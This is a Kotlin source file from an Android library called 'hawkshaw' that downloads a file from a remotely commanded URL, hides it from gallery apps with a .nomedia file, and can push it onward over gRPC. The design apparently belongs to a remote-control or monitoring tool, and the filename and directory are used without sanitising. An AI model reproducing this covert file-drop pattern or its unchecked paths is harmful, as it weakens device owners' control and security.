package com.hawkshaw.library.features.media.filecrud

import android.os.Environment
import android.util.Log // Added for Android logging
import com.hawkshaw.library.datalayer.models.Command
import com.hawkshaw.library.datalayer.room.files.PushFileTaskEntity
import com.hawkshaw.library.logger.Logger
import kotlinx.coroutines.Dispatchers
import com.hawkshaw.library.datalayer.Injector
import kotlinx.coroutines.withContext
import java.io.File
import java.io.FileOutputStream
import java.net.URL
import okhttp3.Request
import java.util.UUID
import java.util.concurrent.TimeUnit
import kotlinx.serialization.Serializable
import okhttp3.OkHttpClient

private const val TAG = "FileDownloadKt"
/**
 * Request class for downloading files
 */
@Serializable
data class DownloadFileRequest(
    val url: String,
    val directory: String? = null,
    val filename: String? = null,
    val upload: Boolean = false,
    val buffer: Int? = null
)

/**
 * Downloads a file from the given URL and saves it to the specified directory.
 */
suspend fun downloadFile(fileRequest: DownloadFileRequest): Any = withContext(Dispatchers.IO) {
    Log.d(TAG, "[DEBUG] downloadFile called with request: $fileRequest")
    try {
        // Existing Logger.d is fine for this general entry.
        Logger.d(TAG, "Downloading file: ${fileRequest.url}", false, 4, null)
        
        // Create the destination directory if it doesn't exist
        Log.d(TAG, "[DEBUG] Calling getDownloadDirectory with directoryName: ${fileRequest.directory}")
        val directory = getDownloadDirectory(fileRequest.directory)
        Log.d(TAG, "[DEBUG] Download directory determined: ${directory.absolutePath}")
        if (!directory.exists()) {
            Log.d(TAG, "[DEBUG] Directory does not exist. Creating directory: ${directory.absolutePath}")
            directory.mkdirs()
        }
        
        // Create .nomedia file to hide media from gallery apps
        val nomediaFile = File(directory, ".nomedia")
        if (!nomediaFile.exists()) {
            Log.d(TAG, "[DEBUG] .nomedia file does not exist. Creating: ${nomediaFile.absolutePath}")
            nomediaFile.createNewFile()
        }
        
        // Determine the filename from the URL or use default
        Log.d(TAG, "[DEBUG] Calling getFileName with fileRequest: $fileRequest")
        val fileName = getFileName(fileRequest)
        Log.d(TAG, "[DEBUG] Filename determined: $fileName")
        val destinationFile = File(directory, fileName)
        Log.d(TAG, "[DEBUG] Destination file path: ${destinationFile.absolutePath}")

        // Create a new file
        if (!destinationFile.exists()) {
            Log.d(TAG, "[DEBUG] Destination file does not exist. Creating: ${destinationFile.absolutePath}")
            destinationFile.createNewFile()
        }
        
        // Set up HTTP client
        Log.d(TAG, "[DEBUG] Setting up OkHttpClient with 30s connect/read timeouts.")
        val client = OkHttpClient.Builder()
            .connectTimeout(30, TimeUnit.SECONDS)
            .readTimeout(30, TimeUnit.SECONDS)
            .build()
        
        // Create the request
        Log.d(TAG, "[DEBUG] Building HTTP GET request for URL: ${fileRequest.url}")
        val request = Request.Builder()
            .url(fileRequest.url)
            .get()
            .build()
        
        // Execute the download
        Log.d(TAG, "[DEBUG] Executing download request.")
        client.newCall(request).execute().use { response ->
            Log.d(TAG, "[DEBUG] Download response received. Code: ${response.code}, Successful: ${response.isSuccessful}")
            if (!response.isSuccessful) {
                Log.e(TAG, "[DEBUG] Failed to download file. Response code: ${response.code}, Message: ${response.message}")
                throw Exception("Failed to download file: ${response.code}")
            }
            
            // Save the response body to the file
            Log.d(TAG, "[DEBUG] Saving response body to file: ${destinationFile.absolutePath}")
            val inputStream = response.body?.byteStream()
            val outputStream = FileOutputStream(destinationFile)
            
            inputStream?.use { input ->
                outputStream.use { output ->
                    val buffer = ByteArray(4096)
                    var bytesRead: Int
                    var totalBytesRead = 0L
                    Log.d(TAG, "[DEBUG] Starting to read from input stream and write to output stream.")
                    while (input.read(buffer).also { bytesRead = it } != -1) {
                        output.write(buffer, 0, bytesRead)
                        totalBytesRead += bytesRead
                    }
                    output.flush()
                    Log.d(TAG, "[DEBUG] Finished writing to output stream. Total bytes read: $totalBytesRead")
                }
            } ?: Log.w(TAG, "[DEBUG] Input stream from response body is null.")
        }
        
        // Log success and notify server
        Log.d(TAG, "[DEBUG] File downloaded successfully: ${destinationFile.absolutePath}")
        // Existing Logger.d is fine for this high-level success.
        Logger.d(
            TAG,
            "File downloaded successfully: ${destinationFile.absolutePath}",
            false,
            4,
            null
        )
        
        // Create a PushFileTask for the downloaded file if requested
        Log.d(TAG, "[DEBUG] Checking if upload is requested: ${fileRequest.upload}")
        if (fileRequest.upload) {
            val pushFileTask = PushFileTaskEntity(
                path = destinationFile.absolutePath,
                source = Command.FileRequest.Source.FileExplorer,
                medium = Command.FileRequest.Medium.Grpc,
                buffer = fileRequest.buffer ?: (512 * 1024)
            )
            Log.d(TAG, "[DEBUG] Upload requested. Creating PushFileTaskEntity: $pushFileTask")
            Injector.INSTANCE.mediaService.pushFile(pushFileTask)
            Log.d(TAG, "[DEBUG] PushFileTaskEntity submitted to mediaService.")
        }
        
        Log.d(TAG, "[DEBUG] downloadFile returning path: ${destinationFile.absolutePath}")
        return@withContext destinationFile.absolutePath
    } catch (e: Exception) {
        Log.e(TAG, "[DEBUG] Error downloading file: ${e.message}", e)
        // Existing Logger.e is fine for this high-level error.
        Logger.e(TAG, "Error downloading file", e, false, 12, null)
        Log.d(TAG, "[DEBUG] downloadFile returning error message: Error: ${e.message}")
        return@withContext "Error: ${e.message}"
    }
}

/**
 * Determines the appropriate download directory based on the request.
 */
private fun getDownloadDirectory(directoryName: String?): File {
    Log.d(TAG, "[DEBUG] getDownloadDirectory called with directoryName: $directoryName")
    return if (directoryName.isNullOrEmpty()) {
        // Use default directory
        val externalDir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS)
        val defaultDir = File(externalDir, "hawkshaw")
        Log.d(TAG, "[DEBUG] Using default download directory: ${defaultDir.absolutePath}")
        defaultDir
    } else {
        // Use specified directory
        val specifiedDir = File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS), directoryName)
        Log.d(TAG, "[DEBUG] Using specified download directory: ${specifiedDir.absolutePath}")
        specifiedDir
    }
}

/**
 * Extracts filename from URL or generates a unique name if not available.
 */
private fun getFileName(fileRequest: DownloadFileRequest): String {
    Log.d(TAG, "[DEBUG] getFileName called with fileRequest: $fileRequest")
    // Use filename from request if provided
    if (!fileRequest.filename.isNullOrEmpty()) {
        Log.d(TAG, "[DEBUG] Using filename from request: ${fileRequest.filename}")
        return fileRequest.filename
    }
    
    // Try to extract filename from URL
    Log.d(TAG, "[DEBUG] Attempting to extract filename from URL: ${fileRequest.url}")
    try {
        val url = URL(fileRequest.url)
        val path = url.path
        val extractedFileName = path.substring(path.lastIndexOf('/') + 1)
        Log.d(TAG, "[DEBUG] Extracted path from URL: $path, potential filename: $extractedFileName")
        
        // If filename is not empty, use it
        if (extractedFileName.isNotEmpty()) {
            Log.d(TAG, "[DEBUG] Using extracted filename from URL: $extractedFileName")
            return extractedFileName
        } else {
            Log.d(TAG, "[DEBUG] Extracted filename from URL is empty.")
        }
    } catch (e: Exception) {
        Log.e(TAG, "[DEBUG] Error extracting filename from URL: ${e.message}", e)
        // Existing Logger.e is fine for this.
        Logger.e(TAG, "Error extracting filename from URL", e, false, 12, null)
    }
    
    // Generate a unique filename if extraction fails
    val uniqueFileName = "download_${UUID.randomUUID()}.file"
    Log.d(TAG, "[DEBUG] Generating unique filename: $uniqueFileName")
    return uniqueFileName
}

